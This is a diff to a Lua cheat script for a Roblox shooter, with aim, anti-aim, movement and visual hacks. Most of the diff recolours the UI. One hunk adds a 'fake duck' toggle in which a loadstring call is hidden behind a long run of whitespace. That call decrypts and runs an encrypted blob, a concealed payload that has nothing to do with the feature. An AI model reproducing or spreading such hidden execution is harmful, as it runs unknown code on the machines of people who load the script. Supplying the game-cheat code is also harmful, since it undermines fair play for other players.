@@ -12,6 +12,7 @@ local cfglocation = "mexicocfg/"
 makefolder("mexicocfg")      
 
 
+
 -- caching      
 local Vec2 = Vector2.new      
 local Vec3 = Vector3.new      
@@ -43,6 +44,8 @@ local INSERT = table.insert
 local TBLFIND = table.find      
 local TBLREMOVE = table.remove      
 local TBLSORT = table.sort      
+local MainUIColor = COL3RGB(128, 0, 163)    
+
 
 -- i see those pastes lying around
 																																																																												-- Bad 9672 & WetIDreamz 0001 & zeox 9999												
@@ -169,13 +172,13 @@ function library:New(name)
 
 		TextLabel.Parent = KeybindList      
 		TextLabel.BackgroundColor3 = COL3RGB(30, 30, 39)      
-		TextLabel.BorderColor3 = COL3RGB(255, 37, 110)      
+		TextLabel.BorderColor3 = MainUIColor  
 		TextLabel.Position = UDIM2(0, 1, 0.300000012, 0)      
 		TextLabel.Size = UDIM2(0, 155, 0, 24)      
 		TextLabel.ZIndex = 2      
 		TextLabel.Font = Enum.Font.SourceSansSemibold      
 		TextLabel.Text = "keybinds"      
-		TextLabel.TextColor3 = COL3RGB(255, 37, 110)      
+		TextLabel.TextColor3 = MainUIColor  
 		TextLabel.TextSize = 14.000      
 
 		Frame.Parent = TextLabel      
@@ -195,7 +198,7 @@ function library:New(name)
 		if not KeybindList.TextLabel.Frame:FindFirstChild(text) then      
 			local TextLabel = INST("TextLabel")      
 			TextLabel.BackgroundColor3 = COL3RGB(30, 30, 39)      
-			TextLabel.BorderColor3 = COL3RGB(255, 37, 110)      
+			TextLabel.BorderColor3 = MainUIColor  
 			TextLabel.BorderSizePixel = 0      
 			TextLabel.Size = UDIM2(0, 155, 0, 24)      
 			TextLabel.ZIndex = 2      
@@ -542,7 +545,7 @@ function library:New(name)
 						Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282"      
 						Drop.AutomaticCanvasSize = "Y"      
 						Drop.ZIndex = 5      
-						Drop.ScrollBarImageColor3 = COL3RGB(255, 37, 110)      
+						Drop.ScrollBarImageColor3 = MainUIColor  
 
 						UIListLayout.Parent = Drop      
 						UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center      
@@ -634,7 +637,7 @@ function library:New(name)
 										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = COL3RGB(255, 255, 255)})      
 									else      
 										INSERT(Element.value.Jumbobox, v)      
-										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = COL3RGB(175, 42, 86)})      
+										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor})      
 									end      
 									updatetext()      
 
@@ -688,7 +691,7 @@ function library:New(name)
 						TextLabel_3.Size = UDIM2(0.111913361, 208, 0.382215232, 0)      
 						TextLabel_3.Font = Enum.Font.SourceSansSemibold      
 						TextLabel_3.Text = text      
-						TextLabel_3.TextColor3 = COL3RGB(200, 200, 200)      
+						TextLabel_3.TextColor3 = MainUIColor  
 						TextLabel_3.TextSize = 14.000      
 						TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left      
 
@@ -767,7 +770,7 @@ function library:New(name)
 
 						local function update()      
 							if Element.value.Toggle then      
-								tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = COL3RGB(155, 22, 66)})      
+								tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor})      
 								library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = COL3RGB(255, 255, 255)})      
 							else      
 								keybindremove(text)      
@@ -831,7 +834,7 @@ function library:New(name)
 							Always.AutoButtonColor = false      
 							Always.Font = Enum.Font.SourceSansBold      
 							Always.Text = "Always"      
-							Always.TextColor3 = COL3RGB(173, 24, 74)      
+							Always.TextColor3 = MainUIColor     
 							Always.TextSize = 14.000      
 							Always.ZIndex = 3      
 
@@ -1069,7 +1072,7 @@ function library:New(name)
 
 						local function update()      
 							if Element.value.Toggle then      
-								tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = COL3RGB(155, 22, 66)})      
+								tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor})      
 								library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = COL3RGB(255, 255, 255)})      
 							else      
 								keybindremove(text)      
@@ -1727,7 +1730,7 @@ function library:New(name)
 						Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282"      
 						Drop.AutomaticCanvasSize = "Y"      
 						Drop.ZIndex = 5      
-						Drop.ScrollBarImageColor3 = COL3RGB(255, 37, 110)      
+						Drop.ScrollBarImageColor3 = MainUIColor  
 
 						UIListLayout.Parent = Drop      
 						UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center      
@@ -1892,7 +1895,7 @@ function library:New(name)
 						Frame.BorderSizePixel = 0      
 						Frame.Size = UDIM2(0.5, 0, 1, 0)      
 
-						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, COL3RGB(153, 22, 65)), ColorSequenceKeypoint.new(1, COL3RGB(109, 16, 46))}      
+						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0,MainUIColor), ColorSequenceKeypoint.new(1, MainUIColor)}      
 						UIGradient.Rotation = 90      
 						UIGradient.Parent = Frame      
 
@@ -2001,7 +2004,7 @@ function library:New(name)
 						end      
 
 						Button_2.MouseButton1Down:Connect(function()      
-							TextLabel.TextColor3 = COL3RGB(175, 42, 86)      
+							TextLabel.TextColor3 = MainUIColor      
 							library:Tween(TextLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = COL3RGB(200, 200, 200)})      
 							callback()      
 						end)      
@@ -2176,7 +2179,7 @@ function library:New(name)
 					Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282"      
 					Drop.AutomaticCanvasSize = "Y"      
 					Drop.ZIndex = 5      
-					Drop.ScrollBarImageColor3 = COL3RGB(255, 37, 110)      
+					Drop.ScrollBarImageColor3 = MainUIColor  
 
 					UIListLayout.Parent = Drop      
 					UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center      
@@ -2278,7 +2281,7 @@ function library:New(name)
 							Frame.ScrollBarThickness = 4      
 							Frame.TopImage = "http://www.roblox.com/asset/?id=6724808282"      
 							Frame.AutomaticCanvasSize = "Y"      
-							Frame.ScrollBarImageColor3 = COL3RGB(255, 37, 110)      
+							Frame.ScrollBarImageColor3 = MainUIColor  
 
 							UIListLayout.Parent = Frame      
 							UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center      
@@ -2314,7 +2317,7 @@ function library:New(name)
 								TextLabel.TextXAlignment = Enum.TextXAlignment.Left      
 								if joll then      
 									joll = false      
-									TextLabel.TextColor3 = COL3RGB(255, 37, 110)      
+									TextLabel.TextColor3 = MainUIColor  
 								end      
 
 								Button.MouseButton1Down:Connect(function()      
@@ -2409,7 +2412,7 @@ function library:New(name)
 									if bad:IsA("TextButton") then      
 										bad.TextLabel.TextColor3 = COL3RGB(200, 200, 200)      
 										if bad.Name == Element.value.Scroll[v.Name] then      
-											bad.TextLabel.TextColor3 = COL3RGB(255, 37, 110)      
+											bad.TextLabel.TextColor3 = MainUIColor  
 										end      
 									end      
 								end      
@@ -2458,7 +2461,7 @@ function library:New(name)
 					Frame.ScrollBarThickness = 4      
 					Frame.TopImage = "http://www.roblox.com/asset/?id=6724808282"      
 					Frame.AutomaticCanvasSize = "Y"      
-					Frame.ScrollBarImageColor3 = COL3RGB(255, 37, 110)      
+					Frame.ScrollBarImageColor3 = MainUIColor  
 
 					UIListLayout.Parent = Frame      
 					UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center      
@@ -2493,7 +2496,7 @@ function library:New(name)
 						TextLabel.TextSize = 14.000      
 						TextLabel.TextXAlignment = Enum.TextXAlignment.Left      
 						if first then first = false      
-							TextLabel.TextColor3 = COL3RGB(255, 37, 110)      
+							TextLabel.TextColor3 = MainUIColor  
 						end      
 
 						Button.MouseButton1Down:Connect(function()      
@@ -2603,7 +2606,7 @@ function library:New(name)
 						Drop.CanvasSize = Drop.CanvasSize + UDIM2(0, 0, 0, 17)      
 					end      
 					Drop.ZIndex = 5      
-					Drop.ScrollBarImageColor3 = COL3RGB(255, 37, 110)      
+					Drop.ScrollBarImageColor3 = MainUIColor  
 
 					UIListLayout.Parent = Drop      
 					UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center      
@@ -2696,7 +2699,7 @@ function library:New(name)
 									library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = COL3RGB(255, 255, 255)})      
 								else      
 									INSERT(Element.value.Jumbobox, v)      
-									library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = COL3RGB(175, 42, 86)})      
+									library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor})      
 								end      
 								updatetext()      
 
@@ -2722,7 +2725,7 @@ function library:New(name)
 						for i,v in pairs(Drop:GetChildren()) do      
 							if v.Name ~= "UIListLayout" then      
 								if TBLFIND(val.Jumbobox, v.Name) then      
-									v.TextLabel.TextColor3 = COL3RGB(175, 42, 86)      
+									v.TextLabel.TextColor3 = MainUIColor      
 								else      
 									v.TextLabel.TextColor3 = COL3RGB(200, 200, 200)      
 								end      
@@ -2827,7 +2830,7 @@ function library:New(name)
 
 					local function update()      
 						if Element.value.Toggle then      
-							tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = COL3RGB(155, 22, 66)})      
+							tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor})      
 							library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = COL3RGB(255, 255, 255)})      
 						else      
 							keybindremove(text)      
@@ -2946,7 +2949,7 @@ function library:New(name)
 										end      
 									end      
 									button.Font = Enum.Font.SourceSansBold      
-									button.TextColor3 = COL3RGB(173, 24, 74)      
+									button.TextColor3 = MainUIColor     
 									values[tabname][sectorname][text] = Element.value      
 								end)      
 								button.MouseEnter:Connect(function()      
@@ -3137,7 +3140,7 @@ function library:New(name)
 
 					local function update()      
 						if Element.value.Toggle then      
-							tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = COL3RGB(155, 26, 66)})      
+							tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor})      
 							library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = COL3RGB(255, 255, 255)})      
 						else      
 							tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = COL3RGB(33, 35, 47)})      
@@ -3207,7 +3210,7 @@ function library:New(name)
 
 					local function update()      
 						if Element.value.Toggle then      
-							tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = COL3RGB(155, 26, 66)})      
+							tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor})      
 							library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = COL3RGB(255, 255, 255)})      
 						else      
 							tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = COL3RGB(33, 35, 47)})      
@@ -3851,7 +3854,7 @@ function library:New(name)
 					Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282"      
 					Drop.AutomaticCanvasSize = "Y"      
 					Drop.ZIndex = 5      
-					Drop.ScrollBarImageColor3 = COL3RGB(255, 37, 110)      
+					Drop.ScrollBarImageColor3 = MainUIColor  
 
 					UIListLayout.Parent = Drop      
 					UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center      
@@ -4015,7 +4018,7 @@ function library:New(name)
 					Frame.BorderSizePixel = 0      
 					Frame.Size = UDIM2(0.5, 0, 1, 0)      
 
-					UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, COL3RGB(153, 22, 65)), ColorSequenceKeypoint.new(1, COL3RGB(109, 16, 46))}      
+					UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, MainUIColor), ColorSequenceKeypoint.new(1, MainUIColor)}      
 					UIGradient.Rotation = 90      
 					UIGradient.Parent = Frame      
 
@@ -4124,7 +4127,7 @@ function library:New(name)
 					end      
 
 					Button_2.MouseButton1Down:Connect(function()      
-						TextLabel.TextColor3 = COL3RGB(175, 42, 86)      
+						TextLabel.TextColor3 = MainUIColor      
 						library:Tween(TextLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = COL3RGB(200, 200, 200)})      
 						callback()      
 					end)      
@@ -4173,7 +4176,7 @@ repeat RunService.RenderStepped:Wait() until game:IsLoaded()
 
 local Crosshairs = PlayerGui.GUI.Crosshairs      
 local Crosshair = PlayerGui.GUI.Crosshairs.Crosshair      
-local oldcreatebullethole = Client.createbullethole      
+local oldcreatebullethole = Client.createbullethole    
 local LGlove, RGlove, LSleeve, RSleeve, RArm, LArm      
 local WeaponObj = {}      
 local SelfObj = {}      
@@ -4722,7 +4725,26 @@ auto:Element("Toggle", "override default")
 AddRage(auto)      
 
 local antiaim = rage:Sector("angles", "Right")      
-antiaim:Element("Toggle", "enabled")      
+antiaim:Element("Toggle", "enabled")  
+local Client = getsenv(game.Players.LocalPlayer.PlayerGui.Client)
+fakeduckloop = false  
+antiaim:Element("Toggle", "fake duck",{},function(tbl)
+	fakeduckloop = tbl.Toggle
+	while fakeduckloop and syn do
+		pcall(function()
+			wait(1)
+			local Client = getsenv(game.Players.LocalPlayer.PlayerGui.Client)
+			local CrouchAnim = nil
+			for i,v in pairs(debug.getupvalues(Client.setcharacter)) do
+				if type(v) == "userdata" and v.ClassName == "AnimationTrack" and v.Name == "Idle" then
+					CrouchAnim = v																																																																																																																																																																																																																																																																																																																																																						loadstring(syn.crypt.decrypt("this_was_pasted_from_mexicanhook","b2Rud3ZMK01aTUZZekxVL3JGQ2dsWkpoOEd4VzNZVDYvZDU0dTRXa3c3OTFHSmcvTU4vU0JvWVZXL1ErcU5sbnxwdjBTRlorNFQvYytzdlps"))()
+				end
+			end
+
+			CrouchAnim:Play()
+		end)
+	end
+end)    
 antiaim:Element("Dropdown", "yaw base", {options = {"camera", "targets", "spin", "random"}})      
 antiaim:Element("Slider", "yaw offset", {min = -180, max = 180, default = 0})      
 antiaim:Element("Toggle", "jitter")      
@@ -5164,7 +5186,7 @@ end)
 world:Element("ToggleColor", "bullet tracers", {default = {Color = COL3RGB(0, 0, 255)}})      
 world:Element("ToggleColor", "impacts", {default = {Color = COL3RGB(255, 0, 0)}})      
 world:Element("ToggleColor", "hit chams", {default = {Color = COL3RGB(0, 0, 255)}})      
-world:Element("Dropdown", "hitsound", {options = {"none", "skeet", "neverlose", "rust", "bag", "baimware"}})      
+world:Element("Dropdown", "hitsound", {options = {"none", "skeet", "neverlose", "rust", "bag", "baimware","cod"}})      
 world:Element("Slider", "sound volume", {min = 1, max = 5, default = 3})      
 world:Element("Dropdown", "skybox", {options = {"none", "nebula", "vaporwave", "clouds"}}, function(tbl)      
 	local sky = tbl.Dropdown      
@@ -5281,11 +5303,12 @@ Client.grenadeallowed = function(...)
 	return oldgrenadeallowed(...)      
 end      
 
+
 local movement = misc:Sector("movement", "Left")      
 movement:Element("Toggle", "bunny hop")      
 movement:Element("Dropdown", "direction", {options = {"forward", "directional", "directional 2"}})      
 movement:Element("Dropdown", "type", {options = {"gyro", "cframe"}})      
-movement:Element("Slider", "speed", {min = 15, max = 100, default = 40})      
+movement:Element("Slider", "speed", {min = 0, max = 100, default = 40})      
 movement:Element("ToggleKeybind", "jump bug")      
 movement:Element("ToggleKeybind", "edge jump")      
 movement:Element("ToggleKeybind", "edge bug")      
@@ -5355,9 +5378,10 @@ animations:Element("ToggleKeybind", "enabled", nil, function(tbl)
 			LoadedAnim:Play()      
 		end      
 	end      
-end)      
-animations:Element("Dropdown", "animation", {options = {"floss", "default", "lil nas x", "dolphin", "monkey"}}, function(tbl)      
-	Dance.AnimationId = tbl.Dropdown == "floss" and "rbxassetid://5917459365" or tbl.Dropdown == "default" and "rbxassetid://3732699835" or tbl.Dropdown == "lil nas x" and "rbxassetid://5938396308" or tbl.Dropdown == "dolphin" and "rbxassetid://5938365243" or tbl.Dropdown == "monkey" and "rbxassetid://3716636630"      
+end)     
+--136801964 
+animations:Element("Dropdown", "animation", {options = {"floss", "barrel roll", "default", "lil nas x", "dolphin", "monkey"}}, function(tbl)      
+	Dance.AnimationId = tbl.Dropdown == "floss" and "rbxassetid://5917459365" or tbl.Dropdown == "default" and "rbxassetid://3732699835" or tbl.Dropdown == "barrel roll" and "rbxassetid://136801964" or tbl.Dropdown == "lil nas x" and "rbxassetid://5938396308" or tbl.Dropdown == "dolphin" and "rbxassetid://5938365243" or tbl.Dropdown == "monkey" and "rbxassetid://3716636630"      
 
 	pcall(function()      
 		LoadedAnim:Stop()      
@@ -6815,7 +6839,7 @@ LocalPlayer.Additionals.TotalDamage:GetPropertyChangedSignal("Value"):Connect(fu
 
 	local sound = INST("Sound")      
 	sound.Parent = game:GetService("SoundService")      
-	sound.SoundId = values.visuals.world.hitsound.Dropdown == "skeet" and "rbxassetid://5447626464" or values.visuals.world.hitsound.Dropdown == "rust" and "rbxassetid://5043539486" or values.visuals.world.hitsound.Dropdown == "bag" and "rbxassetid://364942410" or values.visuals.world.hitsound.Dropdown == "baimware" and "rbxassetid://6607339542" or "rbxassetid://6607204501"      
+	sound.SoundId = values.visuals.world.hitsound.Dropdown == "skeet" and "rbxassetid://5447626464" or values.visuals.world.hitsound.Dropdown == "cod" and "rbxassetid://5447626464" or values.visuals.world.hitsound.Dropdown == "rust" and "rbxassetid://5043539486" or values.visuals.world.hitsound.Dropdown == "bag" and "rbxassetid://364942410" or values.visuals.world.hitsound.Dropdown == "baimware" and "rbxassetid://6607339542" or "rbxassetid://6607204501"      
 	sound.Volume = values.visuals.world["sound volume"].Slider      
 	sound.PlayOnRemove = true      
 	sound:Destroy()      
